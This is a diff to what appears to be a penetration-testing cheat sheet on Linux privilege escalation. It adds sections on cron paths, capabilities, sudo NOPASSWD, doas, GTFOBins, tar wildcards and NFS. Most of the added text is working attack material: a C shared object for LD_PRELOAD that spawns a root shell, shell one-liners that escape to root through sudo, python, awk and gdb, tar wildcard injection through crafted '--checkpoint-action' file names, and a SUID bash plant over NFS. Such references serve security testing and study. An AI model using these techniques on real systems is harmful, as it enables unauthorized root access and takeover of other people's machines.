@@ -13,9 +13,20 @@
 ## Summary
 
 * [Checklist](#checklist)
+* [Cron job](#cron-job)
 * [SUID](#suid)
+    * [Find SUID binaries](#find-suid-binaries)
+    * [Create a SUID binary](#create-a-suid-binary)
 * [Capabilities](#capabilities)
+    * [List capabilities of binaries](#list-capabilities-of-binaries)
+    * [Edit capabilities](#edit-capabilities)
+    * [Interesting capabilities](#interesting-capabilities)
 * [SUDO](#sudo)
+    * [NOPASSWD](#nopasswd)
+    * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
+    * [Doas](#doas)
+* [GTFOBins](#gtfobins)
+* [Wildcard](#wildcard)
 * [Groups](#groups)
     * [Docker](#docker)
 
@@ -92,7 +103,28 @@
   * Checks to see if the host has Docker installed
   * Checks to determine if we're in an LXC container
 
+## Cron job
 
+Check if you have access with write permission on these files.   
+Check inside the file, to find other paths with write permissions.   
+
+```powershell
+/etc/init.d
+/etc/cron.d 
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/at.allow
+/etc/at.deny
+/etc/crontab
+/etc/cron.allow
+/etc/cron.deny
+/etc/anacrontab
+/var/spool/cron/crontabs/root
+```
 
 ## SUID
 
@@ -122,10 +154,11 @@ sudo chmod +s /tmp/suid # setuid bit
 
 ## Capabilities
 
-List capabilities of binaries 
+### List capabilities of binaries 
+
 ```bash
 ╭─swissky@crashmanjaro ~  
-╰─$ getcap -r  /usr/bin
+╰─$ /usr/bin/getcap -r  /usr/bin
 /usr/bin/fping                = cap_net_raw+ep
 /usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
 /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
@@ -135,13 +168,14 @@ List capabilities of binaries
 /usr/bin/rcp                  = cap_net_bind_service+ep
 ```
 
-Edit capabilities
+### Edit capabilities
+
 ```powershell
-/sbin/setcap -r /bin/ping      # remove
-setcap cap_net_raw+p /bin/ping # add
+/usr/bin/setcap -r /bin/ping            # remove
+/usr/bin/setcap cap_net_raw+p /bin/ping # add
 ```
 
-Interesting capabilities
+### Interesting capabilities
 
 ```powershell
 cap_dac_read_search # read anything
@@ -151,14 +185,17 @@ cap_setuid+ep # setuid
 Example of privilege escalation with `cap_setuid+ep`
 
 ```powershell
-$ sudo setcap cap_setuid+ep /usr/bin/python2.7
+$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
 
 $ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 sh-5.0# id
 uid=0(root) gid=1000(swissky)
 ```
 
+
 ## SUDO
+
+### NOPASSWD
 
 Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
 
@@ -176,13 +213,39 @@ sudo vim -c '!sh'
 sudo -u root vim -c '!sh'
 ```
 
+### LD_PRELOAD and NOPASSWD
+
+If `LD_PRELOAD` is explicitly defined in the sudoers file
+
+```powershell
+Defaults        env_keep += LD_PRELOAD
+```
+
+Compile the following C code with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+
+```powershell
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
+```
+
+Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=/tmp/shell.so find`
+
+### Doas
+
 There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`
 
 ```bash
 permit nopass demo as root cmd vim
 ```
 
-### GTFOBins
+## GTFOBins
 
 [GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
 
@@ -190,7 +253,45 @@ The project collects legitimate functions of Unix binaries that can be abused to
 
 > gdb -nx -ex '!sh' -ex quit    
 > sudo mysql -e '\! /bin/sh'    
-> strace -o /dev/null /bin/sh
+> strace -o /dev/null /bin/sh 
+> sudo awk 'BEGIN {system("/bin/sh")}'
+
+
+## Wildcard
+
+By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.
+
+```powershell
+# create file for exploitation
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
+
+# vulnerable script
+tar cf archive.tar *
+```
+
+Tool: [wildpwn](https://github.com/localh0t/wildpwn)
+
+
+## NFS Root Squashing
+
+When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it
+
+```powershell
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash . 	
+
+# set suid permission
+chmod +s bash 	
+```
 
 
 ## Groups
@@ -231,3 +332,7 @@ uid=0(root) gid=0(root) groups=0(root)
 - [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
 - [Privilege escalation via Docker - April 22, 2015 — Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
 - [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
+- [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
+- [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
+- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
+- [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
